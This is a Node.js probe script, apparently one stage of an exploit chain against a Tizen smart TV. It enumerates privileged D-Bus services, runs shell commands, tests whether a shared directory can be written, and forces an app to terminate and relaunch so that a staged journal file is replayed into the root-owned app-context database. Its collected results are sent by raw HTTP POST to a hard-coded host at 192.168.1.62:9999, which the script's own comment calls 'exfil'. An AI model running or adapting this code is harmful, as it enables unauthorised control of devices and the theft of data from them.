"use strict";

/* p68: fixed scans + terminate/launch Probe10 (fresh p71) + write test
   A. BFS (fixed, string queue): factory, automation, ps_mount/mknod/umount, deviced, register
   B. full XML litewebappservice server (maxLen 16000) -> parse launch_app/terminate_app in-args
   C. app_ctxmgr_get_context (no args) + get_current_showing_app
   D. write test in /home/owner/share/tmp/sdk_tools
   E. terminate_app(Probe10) -> wait 10s -> launch_app(Probe10) -> wait 90s
   F. verify DST/LIVE md5 + write test readback
   exfil /p68info
 */

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var STAGED = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var DST = '/opt/dbspace/.app-context.db-journal';
var LIVE = '/opt/dbspace/.app-context.db';
var MARKDIR = '/home/owner/share/tmp/sdk_tools';
var LITE = 'org.tizen.tv.litewebappservice.server';
var LITE_PATH = '/org/tizen/tv/litewebappservice/server';
var APP = 'ProbeTenio.Probe10';
var R = { ts: new Date().toISOString(), probe: 'p68', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(120000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p68info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs, maxLen) {
  maxLen = maxLen || 8000;
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out.substring(0, maxLen);
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, maxLen);
  }
}

function parseNodes(text) {
  var nodes = [];
  var re = /node name=['"]([^'"]+)['"]/g;
  var m;
  while ((m = re.exec(String(text))) !== null) {
    if (nodes.indexOf(m[1]) < 0) nodes.push(m[1]);
  }
  return nodes;
}

function parseMethods(text) {
  var out = [];
  var mre = /<method name=['"]([^'"]+)['"]>/g;
  var mm;
  while ((mm = mre.exec(String(text))) !== null) {
    if (out.indexOf(mm[1]) < 0) out.push(mm[1]);
  }
  return out;
}

/* FIXED: queue of strings */
function deepScan(name, rootPath, maxCalls, wantedRe) {
  var found = [];
  var visited = {};
  var queue = [rootPath];
  var calls = 0;
  while (queue.length > 0 && calls < maxCalls) {
    var p = queue.shift();
    calls++;
    if (visited[p]) continue;
    visited[p] = true;
    var out = run('dbus-send --system --print-reply --dest=' + name + ' ' + p + ' org.freedesktop.DBus.Introspectable.Introspect 2>&1 | head -150', 30000, 6000);
    if (out.indexOf('Error') >= 0) continue;
    var methods = parseMethods(out);
    if (methods.length > 0) {
      var matched = [];
      for (var i = 0; i < methods.length; i++) {
        if (wantedRe.test(methods[i])) matched.push(methods[i]);
      }
      if (matched.length > 0) found.push(p + ': ' + matched.join(', '));
    }
    var nodes = parseNodes(out);
    for (var n = 0; n < nodes.length; n++) {
      var child = (p === '/') ? ('/' + nodes[n]) : (p + '/' + nodes[n]);
      if (!visited[child]) queue.push(child);
    }
  }
  return { found: found, calls: calls, paths: Object.keys(visited) };
}

/* extract in-args of a method from raw XML: [{type, name}] in order */
function parseMethodInArgs(xml, methodName) {
  var idx = String(xml).indexOf('<method name="' + methodName + '"');
  if (idx < 0) return null;
  var block = String(xml).substring(idx);
  var end = block.indexOf('</method>');
  if (end < 0) return null;
  block = block.substring(0, end);
  var args = [];
  var are = /<arg type=['"]([^'"]+)['"] name=['"]([^'"]+)['"] direction=['"]in['"]/g;
  var am;
  while ((am = are.exec(block)) !== null) args.push({ type: am[1], name: am[2] });
  return args;
}

function main() {
  /* ---------- A. fixed wide scans ---------- */
  R.results.a1_factory = JSON.stringify(deepScan('org.tizen.tv.factory-service', '/', 25, /.*/));
  R.results.a2_automation = JSON.stringify(deepScan('org.tizen.tv.automation-service', '/', 25, /.*/));
  R.results.a3_ps_mount = JSON.stringify(deepScan('com.safe.ps_mount', '/', 25, /.*/));
  R.results.a4_ps_mknod = JSON.stringify(deepScan('com.safe.ps_mknod', '/', 25, /.*/));
  R.results.a5_ps_umount = JSON.stringify(deepScan('com.safe.ps_umount', '/', 25, /.*/));
  R.results.a6_deviced = JSON.stringify(deepScan('org.tizen.system.deviced', '/', 25, /.*/));
  R.results.a7_register = JSON.stringify(deepScan('org.tizen.registerdevice', '/', 25, /.*/));

  /* ---------- B. full lite XML + parse ---------- */
  var liteXml = run('dbus-send --system --print-reply --dest=' + LITE + ' ' + LITE_PATH + ' org.freedesktop.DBus.Introspectable.Introspect 2>&1', 30000, 16000);
  R.results.b_lite_xml = liteXml;
  var launchArgs = parseMethodInArgs(liteXml, 'launch_app');
  var termArgs = parseMethodInArgs(liteXml, 'terminate_app');
  R.results.b_launch_args = JSON.stringify(launchArgs);
  R.results.b_term_args = JSON.stringify(termArgs);

  /* ---------- C. read-only probes ---------- */
  R.results.c1_ctx = run('dbus-send --system --print-reply --dest=org.tizen.tv.appfw.appctxmgr --type=method_call /org/tizen/tv/appfw/appctxmgr org.tizen.tv.appfw.appctxmgr.app_ctxmgr_get_context 2>&1 | head -10', 30000);
  R.results.c2_showing = run('dbus-send --system --print-reply --dest=' + LITE + ' --type=method_call ' + LITE_PATH + ' org.tizen.tv.litewebappservice.server.interface.get_current_showing_app 2>&1 | head -10', 30000);

  /* ---------- D. write test ---------- */
  var wt = MARKDIR + '/p68_write_test.txt';
  try {
    fs.writeFileSync(wt, 'p68 write test ' + new Date().toISOString() + '\n', 'utf8');
    var back = fs.readFileSync(wt, 'utf8');
    R.results.d_write_test = 'OK readback: ' + back.trim();
  } catch (e) {
    R.results.d_write_test = 'ERR ' + e;
  }

  /* ---------- E. terminate + launch Probe10 ---------- */
  if (termArgs && termArgs.length > 0) {
    var tapp = termArgs[0].name === 'app_id' ? termArgs[0] : termArgs[0];
    var targs = '';
    for (var ti = 0; ti < termArgs.length; ti++) {
      if (termArgs[ti].name === 'app_id') targs += 'string:"' + APP + '" ';
      else if (termArgs[ti].type === 's') targs += 'string:"" ';
      else targs += 'int32:0 ';
    }
    R.results.e1_terminate = run('dbus-send --system --print-reply --dest=' + LITE + ' --type=method_call ' + LITE_PATH + ' org.tizen.tv.litewebappservice.server.interface.terminate_app ' + targs.trim() + ' 2>&1 | head -15', 45000);
  } else {
    R.results.e1_terminate = 'no terminate args parsed';
  }

  try { cp.execSync('sleep 10', { timeout: 20000, maxBuffer: 4096 }); } catch (e) {}

  if (launchArgs && launchArgs.length > 0) {
    var largs = '';
    for (var li = 0; li < launchArgs.length; li++) {
      var an = launchArgs[li].name;
      if (an === 'app_id') largs += 'string:"' + APP + '" ';
      else if (an === 'obj_name') largs += 'string:"p68" ';
      else if (an === 'callerid') largs += 'string:"p68" ';
      else if (an === 'forceLaunch') largs += 'int32:1 ';
      else if (launchArgs[li].type === 's') largs += 'string:"" ';
      else largs += 'int32:0 ';
    }
    R.results.e2_launch = run('dbus-send --system --print-reply --dest=' + LITE + ' --type=method_call ' + LITE_PATH + ' org.tizen.tv.litewebappservice.server.interface.launch_app ' + largs.trim() + ' 2>&1 | head -15', 45000);
  } else {
    R.results.e2_launch = 'no launch args parsed';
  }

  /* wait for fresh p71 flow (D1 -> D6 -> J1) */
  try { cp.execSync('sleep 90', { timeout: 110000, maxBuffer: 4096 }); } catch (e) {}

  /* ---------- F. verify ---------- */
  R.results.f1_verify = run('echo ===DST; ls -la ' + DST + ' 2>&1; md5sum ' + DST + ' 2>&1; echo ===LIVE; md5sum ' + LIVE + ' 2>&1; echo ===STAGED; md5sum ' + STAGED + ' 2>&1', 20000);
  R.results.f2_p71markers = run('ls -la ' + MARKDIR + '/ 2>&1 | head -20', 15000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal, 20000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
